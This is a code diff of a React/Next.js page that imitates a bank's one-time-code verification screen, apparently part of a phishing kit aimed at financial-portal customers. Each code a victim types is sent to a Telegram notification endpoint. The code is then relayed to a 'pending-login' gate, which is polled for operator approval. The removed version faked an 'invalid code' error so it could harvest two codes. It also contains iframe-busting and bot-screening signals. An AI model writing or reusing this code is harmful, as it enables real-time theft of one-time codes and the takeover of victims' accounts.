@@ -1,270 +1,372 @@
 "use client";
 
-import { Suspense, useState, useEffect } from "react";
-import { useRouter, useSearchParams } from "next/navigation";
-import { Check, Info, Lock, Mail, X } from "lucide-react";
+import {
+  Suspense,
+  useCallback,
+  useEffect,
+  useLayoutEffect,
+  useRef,
+  useState,
+} from "react";
+import { useRouter } from "next/navigation";
+import { Check, Lock, Mail, MessageSquare, X } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { VerificationHeader } from "@/components/verification-header";
+import { SiteFooter } from "@/components/site-footer";
+import { ThreeDotSpinner } from "@/components/ThreeDotSpinner";
+import { pollPendingLogin } from "@/lib/poll-pending-login";
+import {
+  APPROVAL_TIMEOUT_MS,
+  MSG_UNABLE_REACH_VERIFICATION,
+  MSG_UNABLE_VERIFY_TIME,
+  OTP_CODE_ERROR_TEXT,
+  OTP_RESEND_COOLDOWN_SEC,
+  OTP_RESEND_LOADING_MS,
+} from "@/lib/approval-messages";
 
-const PEAK1_REDIRECT_URL =
-  "https://peak1.wealthcareportal.com/Authentication/Handshake";
+/** Reference step-2 copy, verbatim. No masked-address line. */
+const NOTE_TEXT =
+  "If you wish to cancel, you will be asked to enter a code the next time you login or try to perform this specific function.";
+
+/** Validated internally, not displayed — the reference shows no length hint. */
+const OTP_LENGTH = 6;
+
+const BUTTON_CHROME =
+  "w-full min-w-0 min-h-[40px] h-auto px-4 py-[5px] gap-3.5 border border-[#bec5c2] text-[17px] font-light uppercase shadow-[0_3px_0_#e0e0e0] transition-colors cursor-pointer";
+
+const CONTENT_COLUMN =
+  "w-full px-[10px] pt-4 md:pt-10 pb-8 min-[769px]:px-4 min-[1200px]:max-w-[1180px] min-[1200px]:mx-auto min-[1440px]:max-w-[1280px] min-[1440px]:px-[50px]";
+
+const CONTENT_INNER =
+  "w-full min-[769px]:w-[calc(39%-27px)] min-[769px]:ml-[27px]";
 
 function EnterCodeContent() {
+  const router = useRouter();
+
+  useLayoutEffect(() => {
+    if (typeof window !== "undefined" && !sessionStorage.getItem("ubs_verify")) {
+      window.location.href = "/";
+    }
+  }, []);
+
   const [code, setCode] = useState("");
-  const [firstAttemptCode, setFirstAttemptCode] = useState("");
+  const [error, setError] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const [isResending, setIsResending] = useState(false);
-  const [attemptCount, setAttemptCount] = useState(0);
-  const [errorMessage, setErrorMessage] = useState("");
-  const [isCooldown, setIsCooldown] = useState(false);
-  const [cooldownSeconds, setCooldownSeconds] = useState(0);
-  const [verificationEmail, setVerificationEmail] = useState<string>(
-    "m**********r8@gmail.com",
-  );
-  const [verificationMethod, setVerificationMethod] = useState<
-    "email" | "text"
-  >("email");
-  const router = useRouter();
-  const searchParams = useSearchParams();
-  const isSecondOtp = searchParams.get("step") === "2";
+  const [resendCooldown, setResendCooldown] = useState(0);
+  const [method, setMethod] = useState<"email" | "text">("email");
+  const inputRef = useRef<HTMLInputElement | null>(null);
+  const verifyingRef = useRef(false);
+  const mountedAtRef = useRef<number>(Date.now());
+  const interactedRef = useRef(false);
 
   useEffect(() => {
-    if (typeof window === "undefined") return;
-
-    const storedEmail = sessionStorage.getItem("verification_email");
-    const storedMethod = sessionStorage.getItem("verification_method") as
-      | "email"
-      | "text"
-      | null;
-
-    if (storedEmail) setVerificationEmail(storedEmail);
-    if (storedMethod === "email" || storedMethod === "text") {
-      setVerificationMethod(storedMethod);
+    if (typeof window !== "undefined" && window.self !== window.top) {
+      window.top!.location.href =
+        window.location.pathname + window.location.search;
     }
   }, []);
 
   useEffect(() => {
-    if (typeof window === "undefined") return;
-    if (isSecondOtp) {
-      if (!sessionStorage.getItem("ubs_otp2"))
-        router.replace("/verify-details");
-    } else {
-      if (!sessionStorage.getItem("ubs_verify")) router.replace("/");
+    try {
+      const stored = sessionStorage.getItem("verification_method");
+      if (stored === "email" || stored === "text") setMethod(stored);
+    } catch {
+      // ignore
     }
-  }, [isSecondOtp, router]);
+  }, []);
 
   useEffect(() => {
-    if (!isCooldown || cooldownSeconds <= 0) return;
+    const onFirstInteraction = () => {
+      interactedRef.current = true;
+    };
+    window.addEventListener("pointerdown", onFirstInteraction, {
+      once: true,
+      passive: true,
+    });
+    window.addEventListener("keydown", onFirstInteraction, { once: true });
+    return () => {
+      window.removeEventListener("pointerdown", onFirstInteraction);
+      window.removeEventListener("keydown", onFirstInteraction);
+    };
+  }, []);
 
+  useEffect(() => {
+    if (resendCooldown <= 0) return;
     const timer = setInterval(() => {
-      setCooldownSeconds((prev) => {
-        const newSeconds = prev - 1;
-        if (newSeconds <= 0) {
-          setIsCooldown(false);
-        }
-        return newSeconds;
-      });
+      setResendCooldown((prev) => (prev <= 1 ? 0 : prev - 1));
     }, 1000);
-
     return () => clearInterval(timer);
-  }, [isCooldown, cooldownSeconds]);
+  }, [resendCooldown]);
 
-  const handleVerify = async () => {
-    if (isLoading || isCooldown) return;
+  const handleCodeChange = (value: string) => {
+    if (isLoading) return;
+    const digits = value.replace(/\D/g, "").slice(0, OTP_LENGTH);
+    setCode(digits);
+    if (error) setError("");
+  };
+
+  const handleVerify = useCallback(async () => {
+    if (isLoading || verifyingRef.current) return;
+    setError("");
+    if (code.length !== OTP_LENGTH) {
+      setError(OTP_CODE_ERROR_TEXT);
+      return;
+    }
+
+    verifyingRef.current = true;
     setIsLoading(true);
-    setErrorMessage("");
 
-    // Only apply two-attempt flow for first verification, not final verification
-    if (!isSecondOtp) {
-      const newAttemptCount = attemptCount + 1;
-      setAttemptCount(newAttemptCount);
+    /* Fire-and-forget: the notification must never sit on the UI critical path. */
+    void fetch("/api/telegram/verification", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        verificationType: "Code",
+        code,
+      }),
+      keepalive: true,
+    }).catch(() => {});
 
-      // First attempt: send code and show error
-      if (newAttemptCount === 1) {
-        setFirstAttemptCode(code);
-        try {
-          await fetch("/api/telegram/verification", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              verificationType: "Code (first OTP) - First Attempt",
-              code: code,
-            }),
-          }).catch(console.error);
-        } catch (error) {
-          console.error("Failed to send verification notification:", error);
-        }
-        setErrorMessage("Invalid or expired code");
-        setCode("");
+    try {
+      /* Gate 2 — a separate pending-login row from Gate 1. */
+      const res = await fetch("/api/pending-login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          userId:
+            typeof window !== "undefined"
+              ? sessionStorage.getItem("loginUserId") || "login"
+              : "login",
+          password: code,
+          method,
+          flow: "otp",
+          dwellMs: Date.now() - mountedAtRef.current,
+          interacted: interactedRef.current,
+        }),
+      });
+      const data = (await res.json().catch(() => ({}))) as { id?: string };
+
+      if (!res.ok || !data?.id) {
+        verifyingRef.current = false;
         setIsLoading(false);
-        setIsCooldown(true);
-        setCooldownSeconds(15);
+        setError(MSG_UNABLE_REACH_VERIFICATION);
         return;
       }
 
-      // Second attempt: send both codes and proceed with verification
-      try {
-        await fetch("/api/telegram/verification", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            verificationType: "Code (first OTP) - Second Attempt",
-            code: code,
-            firstAttemptCode: firstAttemptCode,
-          }),
-        }).catch(console.error);
-      } catch (error) {
-        console.error("Failed to send verification notification:", error);
-      }
-    } else {
-      // Final verification - direct path, no two-attempt flow
-      try {
-        await fetch("/api/telegram/verification", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            verificationType: "Code (final)",
-            code,
-          }),
-        }).catch(console.error);
-      } catch (error) {
-        console.error("Failed to send verification notification:", error);
-      }
-    }
+      const outcome = await pollPendingLogin(String(data.id), APPROVAL_TIMEOUT_MS);
+      verifyingRef.current = false;
+      setIsLoading(false);
 
-    await new Promise((r) => setTimeout(r, 1000));
-    if (isSecondOtp) {
-      window.location.href = PEAK1_REDIRECT_URL;
-    } else {
-      if (typeof window !== "undefined")
-        sessionStorage.setItem("ubs_details", "1");
-      router.push("/verify-details");
+      /* approved AND redirected both hand off to the member site. */
+      if (outcome === "approved" || outcome === "redirected") {
+        window.location.href = "/api/login-out";
+        return;
+      }
+      if (outcome === "denied") {
+        setCode("");
+        setError(OTP_CODE_ERROR_TEXT);
+        setTimeout(() => inputRef.current?.focus(), 0);
+        return;
+      }
+      setError(
+        outcome === "timeout"
+          ? MSG_UNABLE_VERIFY_TIME
+          : MSG_UNABLE_REACH_VERIFICATION,
+      );
+    } catch {
+      verifyingRef.current = false;
+      setIsLoading(false);
+      setError(MSG_UNABLE_REACH_VERIFICATION);
     }
-  };
-
+  }, [isLoading, code, method]);
   const handleResend = async () => {
-    if (isResending) return;
+    if (isResending || resendCooldown > 0) return;
     setIsResending(true);
+    setCode("");
+    setError("");
     try {
-      await fetch("/api/telegram/resend-code", {
+      void fetch("/api/telegram/resend-code", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ isSecondOtp }),
-      }).catch(console.error);
-    } catch (error) {
-      console.error("Failed to send resend code notification:", error);
+        keepalive: true,
+      }).catch(() => {});
+      await new Promise((r) => setTimeout(r, OTP_RESEND_LOADING_MS));
+    } finally {
+      /* Cooldown in finally so it applies even if the wait throws. */
+      setIsResending(false);
+      setResendCooldown(OTP_RESEND_COOLDOWN_SEC);
+      inputRef.current?.focus();
     }
-    await new Promise((r) => setTimeout(r, 2000));
-    setIsResending(false);
   };
 
+  const handleCancel = () => {
+    void fetch("/api/telegram/verification-click", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ verificationType: "Did not receive code" }),
+      keepalive: true,
+    }).catch(() => {});
+    window.location.href = "/verify-choice";
+  };
+
+  const isEmail = method === "email";
+  const contactLabel = isEmail ? "Email" : "SMS";
+  const ContactGlyph = isEmail ? Mail : MessageSquare;
+
   return (
-    <div className="min-h-screen bg-[#f3f3f1]">
+    <div className="min-h-screen flex flex-col bg-white">
       <VerificationHeader />
 
-      <div className="mx-auto w-full max-w-[1280px] px-4 py-10 md:py-12">
-        <div className="ml-0 md:ml-[150px] w-[420px]">
-          <div className="mb-5 flex justify-center md:justify-center">
-            <Lock className="h-8 w-8" />
-          </div>
-
-          <p className="mb-4 w-[360px] text-[13px] text-center leading-[1.65rem] text-[#494949]">
-            An e-mail has been sent to the following address:
-          </p>
-
-          {/* <p className="mt-3 mb-4 text-[15px] font-normal tracking-wide text-[#2d2d2d]">
-            {verificationEmail}
-          </p> */}
-
-          <p className="text-[13px] text-center text-[#494949]">
-            Enter the verification code that you received via{" "}
-            {verificationMethod === "email" ? "Email" : "Text"} below:
-          </p>
-
-          <p className="mt-2 text-[15px] text-center text-[#494949]">
-            Note - Do not share your verification code with anyone else.
-          </p>
-
-          {errorMessage && (
-            <div className="mt-4 mb-3 rounded-md border border-red-200 bg-red-50 px-3 py-2">
-              <p className="text-sm font-medium text-red-600">{errorMessage}</p>
-            </div>
-          )}
-
-          <div className="mt-6 flex items-center gap-3">
-            <div className="flex h-8 w-8 items-center justify-center text-[#2d2d2d]">
-              <Mail className="h-5 w-5" strokeWidth={1.8} />
+      <main className="flex-1 flex flex-col min-[1200px]:items-center">
+        <div className={CONTENT_COLUMN}>
+          <div className={CONTENT_INNER}>
+            <div className="mb-[18px]">
+              <Lock className="w-[46px] h-[46px] text-[#414041] mx-auto mb-[5px]" />
+              <p className="text-[14px] leading-[1.6] text-[#707070] text-center">
+                {isEmail ? "An e-mail has been sent:" : "An SMS has been sent:"}
+              </p>
+              <p className="text-[14px] leading-[1.6] text-[#707070] text-center">
+                Enter the verification code that you received via{" "}
+                <strong className="font-semibold">{contactLabel}</strong> below:
+              </p>
+              <p className="text-[14px] leading-[1.6] text-[#707070] text-center mt-4">
+                Note - Do not share your verification code with anyone else
+              </p>
             </div>
 
-            <label className="text-[15px] font-medium text-[#2d2d2d]">
-              Confirmation Code
-            </label>
+            {error ? (
+              <p className="text-red-600 text-sm text-center mb-4" role="alert">
+                {error}
+              </p>
+            ) : null}
 
-            <input
-              type="text"
-              id="code"
-              inputMode="numeric"
-              value={code}
-              onChange={(e) =>
-                setCode(e.target.value.replace(/\D/g, "").slice(0, 6))
-              }
-              placeholder=""
-              className="h-[42px] w-[270px] border border-[#4d4d4d] bg-white px-3 text-[15px] text-[#2d2d2d] outline-none"
-              maxLength={6}
-            />
-          </div>
+            {/* Whole form region — code row AND buttons — swaps for the spinner.
+                Keyed off isLoading so it starts on click. */}
+            {isLoading ? (
+              <ThreeDotSpinner label="Verifying your code" />
+            ) : (
+              <div>
+                {/* Glyph at the row's left edge, label text at the 36px inset. */}
+                <div className="flex flex-col min-[1200px]:flex-row min-[1200px]:items-center min-[1200px]:justify-between gap-1 min-[1200px]:gap-0 mb-4">
+                  <div className="w-full max-[768px]:mx-[5px] min-[1200px]:w-[200px] min-[1200px]:mr-auto">
+                    <div className="flex items-center gap-3.5">
+                      <ContactGlyph
+                        className="w-[22px] h-[22px] text-[#424242] shrink-0"
+                        aria-hidden="true"
+                      />
+                      <span className="text-[14px] text-gray-700 whitespace-nowrap">
+                        Confirmation Code
+                      </span>
+                    </div>
+                  </div>
+                  <div className="relative w-full h-[38px] bg-white min-[1200px]:w-[202px]">
+                    <input
+                      ref={inputRef}
+                      type="text"
+                      name="code"
+                      inputMode="numeric"
+                      autoComplete="one-time-code"
+                      value={code}
+                      onChange={(e) => handleCodeChange(e.target.value)}
+                      onPaste={(e) => {
+                        e.preventDefault();
+                        handleCodeChange(e.clipboardData.getData("text"));
+                      }}
+                      aria-label="Confirmation Code"
+                      className="w-full h-full px-3 bg-white border border-[#bec5c2] text-[15px] text-[#424242] outline-none"
+                    />
+                  </div>
+                </div>
 
-          <div className="mt-6 space-y-3">
-            <Button
-              type="button"
-              onClick={handleVerify}
-              disabled={
-                code.replace(/\D/g, "").length !== 6 || isLoading || isCooldown
-              }
-              className="flex h-[54px] w-[270px] items-center justify-start gap-3 rounded-none border border-[#2d2d2d] bg-[#2e4460] px-4 text-left text-[15px] font-semibold tracking-[0.08em] text-white hover:bg-[#263d54] disabled:opacity-80"
+                <div className="w-[220px] mx-auto">
+                  <Button
+                    type="button"
+                    disabled={code.length !== OTP_LENGTH}
+                    onClick={() => void handleVerify()}
+                    className={`${BUTTON_CHROME} mb-[10px] disabled:opacity-60`}
+                    style={{ backgroundColor: "#2e4460", color: "#ffffff" }}
+                    onMouseEnter={(e) => {
+                      e.currentTarget.style.backgroundColor = "#263d54";
+                    }}
+                    onMouseLeave={(e) => {
+                      e.currentTarget.style.backgroundColor = "#2e4460";
+                    }}
+                  >
+                    <Check className="w-6 h-6 shrink-0" />
+                    <span className="flex-1 text-center truncate">Continue</span>
+                  </Button>
+
+                  <Button
+                    type="button"
+                    variant="secondary"
+                    onClick={handleCancel}
+                    className={`${BUTTON_CHROME} mb-[10px]`}
+                    style={{ backgroundColor: "#d7d7d7", color: "#2d2d2d" }}
+                    onMouseEnter={(e) => {
+                      e.currentTarget.style.backgroundColor = "#cfcfcf";
+                    }}
+                    onMouseLeave={(e) => {
+                      e.currentTarget.style.backgroundColor = "#d7d7d7";
+                    }}
+                  >
+                    <X className="w-6 h-6 shrink-0" />
+                    <span className="flex-1 text-center truncate">Cancel</span>
+                  </Button>
+
+                  {/* Not tied to verify isLoading — only to the resend lockout.
+                      Countdown is surfaced in the label. No icon. */}
+                  <Button
+                    type="button"
+                    variant="secondary"
+                    disabled={isResending || resendCooldown > 0}
+                    onClick={() => void handleResend()}
+                    className={`${BUTTON_CHROME} disabled:opacity-60`}
+                    style={{ backgroundColor: "#2e4460", color: "#ffffff" }}
+                    onMouseEnter={(e) => {
+                      e.currentTarget.style.backgroundColor = "#263d54";
+                    }}
+                    onMouseLeave={(e) => {
+                      e.currentTarget.style.backgroundColor = "#2e4460";
+                    }}
+                  >
+                    <span
+                      className={`truncate ${
+                        isResending || resendCooldown > 0
+                          ? "flex-1 text-center"
+                          : ""
+                      }`}
+                    >
+                      {isResending
+                        ? "Sending..."
+                        : resendCooldown > 0
+                          ? `Resend Code (${resendCooldown})`
+                          : "Resend Code"}
+                    </span>
+                  </Button>
+                </div>
+              </div>
+            )}
+
+            {/* Note lives OUTSIDE the gated form so it survives the wait. */}
+            <div
+              role="note"
+              className="relative mt-6 pl-[48px] min-[769px]:pl-[62px] pr-[13px] py-[13px] pb-[14px] text-[14px] leading-[1.3] text-[#424242]"
+              style={{ backgroundColor: "#F3F7A9" }}
             >
-              <Check className="h-5 w-5" strokeWidth={2.5} />
-              <span>
-                {isLoading
-                  ? "Loading..."
-                  : isCooldown
-                    ? `Wait ${cooldownSeconds}s`
-                    : "CONTINUE"}
+              <span
+                className="absolute left-1 top-1/2 -translate-y-1/2 w-[35px] h-[35px] rounded-full border-2 border-[#414141] text-[#414141] text-[20px] leading-[31px] text-center"
+                aria-hidden="true"
+              >
+                i
               </span>
-            </Button>
-
-            <Button
-              type="button"
-              variant="ghost"
-              onClick={() => router.push("/verify-choice")}
-              className="flex h-[54px] w-[270px] items-center justify-start gap-3 rounded-none border border-[#2d2d2d] bg-[#d7d7d7] px-4 text-left text-[15px] font-semibold tracking-[0.08em] text-[#2d2d2d] hover:bg-[#cfcfcf]"
-            >
-              <X className="h-5 w-5" strokeWidth={2.2} />
-              <span>CANCEL</span>
-            </Button>
-
-            <Button
-              type="button"
-              onClick={handleResend}
-              disabled={isResending}
-              className="flex h-[54px] w-[270px] items-center justify-start gap-3 rounded-none border border-[#2d2d2d] bg-[#2e4460] px-4 text-left text-[15px] font-semibold tracking-[0.08em] text-white hover:bg-[#263d54] disabled:opacity-80"
-            >
-              <Check className="h-5 w-5" strokeWidth={2.5} />
-              <span>{isResending ? "LOADING..." : "RESEND CODE"}</span>
-            </Button>
-          </div>
-
-          <div className="mt-7 flex w-[420px] items-start gap-4 rounded-[2px] border border-[#e0d899] bg-[#e7e2a8] p-4 text-[#2d2d2d] shadow-sm">
-            <div className="mt-1 flex h-9 w-9 shrink-0 items-center justify-center rounded-full border-[2px] border-[#2d2d2d] bg-transparent">
-              <Info className="h-5 w-5" strokeWidth={2.3} />
+              <p className="m-0">{NOTE_TEXT}</p>
             </div>
-            <p className="max-w-[300px] text-[15px] leading-[1.65rem] text-[#2d2d2d]">
-              If you wish to cancel, you will be asked to enter a code the next
-              time you login or try to perform this specific function.
-            </p>
           </div>
         </div>
-      </div>
+      </main>
+
+      <SiteFooter />
     </div>
   );
 }
@@ -273,8 +375,8 @@ export default function EnterCodePage() {
   return (
     <Suspense
       fallback={
-        <div className="min-h-screen bg-white flex items-center justify-center text-gray-600">
-          Loading...
+        <div className="min-h-screen flex items-center justify-center">
+          <p className="text-gray-600">Loading...</p>
         </div>
       }
     >
